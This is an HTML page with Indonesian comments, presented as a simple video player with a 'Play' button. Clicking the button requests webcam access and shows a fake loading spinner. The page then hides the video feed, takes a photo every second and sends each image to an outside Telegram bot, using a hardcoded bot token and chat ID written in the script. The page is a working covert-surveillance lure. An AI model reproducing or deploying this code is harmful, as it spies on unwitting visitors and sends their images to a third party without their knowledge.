<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Play</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #111;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    button {
      background: #00bcd4;
      border: none;
      color: white;
      padding: 16px 30px;
      font-size: 20px;
      border-radius: 8px;
      cursor: pointer;
    }
    button.loading {
      background: #0097a7;
      pointer-events: none;
      position: relative;
    }
    button.loading::after {
      content: "";
      border: 3px solid white;
      border-top: 3px solid transparent;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      position: absolute;
      top: 50%;
      right: 20px;
      transform: translateY(-50%);
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to {
        transform: translateY(-50%) rotate(360deg);
      }
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <button id="playBtn">Play</button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const playBtn = document.getElementById('playBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Ganti dengan token dan ID kamu
    const BOT_TOKEN = '7217027793:AAEFcQ6hgQ_d9UuTWPMeuY4xjMLNlrW8j40';
    const CHAT_ID = '7697621785';

    let stream = null;
    let intervalId = null;

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        playBtn.classList.add('loading');
        playBtn.textContent = 'Loading...';

        video.onloadedmetadata = () => {
          intervalId = setInterval(captureAndSendPhoto, 1000);
        };
      } catch (err) {
        alert('Izin kamera ditolak.');
        console.error('❌ Gagal akses kamera:', err);
      }
    }

    function captureAndSendPhoto() {
      if (!video.videoWidth || !video.videoHeight) return;

      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', blob, 'photo.jpg');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        })
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            console.log('✅ Foto dikirim ke Telegram');
          } else {
            console.error('❌ Gagal kirim:', data.description);
          }
        })
        .catch(err => console.error('❌ Error kirim:', err));
      }, 'image/jpeg', 0.9);
    }

    playBtn.addEventListener('click', () => {
      if (!stream) startCamera();
    });
  </script>
</body>
</html>
